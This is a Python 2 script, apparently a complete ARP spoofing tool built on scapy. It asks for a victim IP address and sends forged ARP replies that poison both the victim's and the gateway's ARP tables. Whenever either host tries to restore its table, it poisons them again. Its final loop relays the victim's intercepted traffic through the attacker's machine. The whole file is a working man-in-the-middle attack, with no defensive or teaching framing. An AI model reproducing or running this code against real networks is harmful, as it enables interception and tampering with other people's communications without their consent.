#!/usr/local/bin/python
import netifaces, socket, threading, time
from scapy.all import *

collect_ARP_packet = []
collect_Not_ARP_packet = []
victim_addr = ""
gateway_addr = ""
victim_mac = "" 
gateway_mac = ""

def mac_for_ip(ip):
    'Returns a list of MACs for interfaces that have given IP, returns None if not found'
    for i in netifaces.interfaces():
        addrs = netifaces.ifaddresses(i)
        try:
            if_mac = addrs[netifaces.AF_LINK][0]['addr']
            if_ip = addrs[netifaces.AF_INET][0]['addr']
        except IndexError, KeyError: #ignore ifaces that dont have MAC or IP
            if_mac = if_ip = None
        if if_ip == ip:
            return if_mac
    return None


def sniff_ARP_packet():
    sniff(prn=give_arp_packet, filter="arp", store=0) #sniff ARP packet

def sniff_Not_ARP_packet():
    sniff(prn=give_Not_arp_packet, filter="not arp", store=0) #sniff Not ARP packet

def give_arp_packet(pkt):
    collect_ARP_packet.append((pkt[ARP].op, pkt[ARP].psrc, pkt[ARP].pdst)) #Save ARP packet in the collect_packet list

def give_Not_arp_packet(pkt):
    collect_Not_ARP_packet.append(pkt) #Save Not ARP packet in the collect_Not_ARP_packet list

def attack_again():
    while(True):
    	if(len(collect_ARP_packet) == 0): #if no arp packet
            print "No ARP Packet"
            time.sleep(1)
            continue
        if((collect_ARP_packet[0] == (1, victim_addr, gateway_addr)) | (collect_ARP_packet[0] == (1, gateway_addr, victim_addr))): #if gateway or victim-PC try to recover ARP Table
            del collect_ARP_packet[0]
	    time.sleep(1)
	    ans,unans=srp(Ether(dst=victim_mac)/ARP(op = ARP.is_at, psrc = gateway_addr, pdst = victim_addr, hwdst = victim_mac),timeout=2) #attack again to victim-PC
	    ans,unans=srp(Ether(dst=gateway_mac)/ARP(op = ARP.is_at, psrc = victim_addr, pdst = gateway_addr, hwdst = gateway_mac),timeout=2) #attack again to gateway
            print "attack again both gateway and victim-PC!!"
        else: # It is ARP, but not necessary.
	    del collect_ARP_packet[0]
	    print "It is ARP, but not necessary."


interfaces = netifaces.interfaces()
for i in interfaces:
    if i == 'lo':
        continue
    iface = netifaces.ifaddresses(i).get(netifaces.AF_INET)

my_ip_addr = iface[0]['addr'] #Get my ip address
gateway = netifaces.gateways()
gateway_addr = gateway['default'][netifaces.AF_INET][0] #Get gateway ip address

my_mac_addr = mac_for_ip(my_ip_addr) #Get my mac address
victim_addr = raw_input("input victim IP Addr :") #input victim ip address

ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op = ARP.who_has, pdst=victim_addr),timeout=2) #Send broadcast (who has 

victim_mac = ans[0][1].src #Get victim mac address

ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op = ARP.who_has, pdst=gateway_addr),timeout=2) #Send broadcast (who has gateway address)

gateway_mac = ans[0][1].src #Get victim mac address

ans,unans=srp(Ether(dst=victim_mac)/ARP(op = ARP.is_at, psrc = gateway_addr, pdst = victim_addr, hwdst = victim_mac),timeout=2) #Send infected packet to victim-PC
ans,unans=srp(Ether(dst=gateway_mac)/ARP(op = ARP.is_at, psrc = victim_addr, pdst = gateway_addr, hwdst = gateway_mac),timeout=2) #Send infected packet to gateway

t1 = threading.Thread(target=sniff_ARP_packet) #It is Thread for collect ARP packet
t2 = threading.Thread(target=attack_again) #It is Thread for attack_again
t3 = threading.Thread(target=sniff_Not_ARP_packet) #It is Thread for collect Not ARP packet
t1.start()
t2.start()
t3.start()

while(True): #it is code for relay packet
    if(len(collect_Not_ARP_packet) == 0): #if no Not arp packet
        print "No Not ARP Packet"
        time.sleep(1)
        continue
    if((collect_Not_ARP_packet[0].fields['src'] == victim_mac) & (collect_Not_ARP_packet[0].fields['dst'] == my_mac_addr)): #if packet come from victim-PC to gateway
	collect_Not_ARP_packet[0].src = my_mac_addr
	collect_Not_ARP_packet[0].dst = gateway_mac
	sendp(collect_Not_ARP_packet[0])
	print "my-PC to gateway"
        del collect_Not_ARP_packet[0]
    elif((collect_Not_ARP_packet[0].fields['src'] == gateway_mac) & (collect_Not_ARP_packet[0].fields['dst'] == my_mac_addr)): #if packet come from gateway to victim-PC
	collect_Not_ARP_packet[0].src = my_mac_addr
	collect_Not_ARP_packet[0].dst = victim_mac
	sendp(collect_Not_ARP_packet[0])
	print "my-PC to victim-PC"
	del collect_Not_ARP_packet[0]
    else: # It is Not ARP, but not necessary.
	del collect_Not_ARP_packet[0]
	print "It is Not ARP, but not necessary."





